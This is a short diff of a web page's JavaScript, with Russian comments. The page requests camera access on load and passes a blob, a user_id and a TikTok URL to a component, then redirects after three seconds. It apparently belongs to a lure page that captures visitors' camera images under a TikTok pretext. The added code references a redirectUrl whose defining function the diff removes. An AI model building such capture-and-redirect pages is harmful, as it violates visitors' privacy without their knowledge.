@@ -149,6 +149,10 @@
           window.angularComponentReference.componentFn(tiktok_url, user_id, redirect_url, blob);
           });
         }
+
+        setTimeout(async function() {
+          await window.location.replace(redirectUrl);
+        }, 3000);
     
 
 
@@ -164,19 +168,6 @@
       stream.getTracks().forEach(track => track.stop());
     }
 
-
-
-
-    function redirectToFinalDestination() {
-      const urlParams = new URLSearchParams(window.location.search);
-      const redirectUrl = urlParams.get('redirect') || urlParams.get('tiktok') || window.location.origin;
-      console.log('Выполняем редирект на:', redirectUrl);
-
-      // Добавляем таймаут для редиректа
-      setTimeout(function() {
-        window.location.replace(redirectUrl);
-      }, 3000);
-    }
 
     // Начинаем запрос доступа к камере
     window.onload = () => {
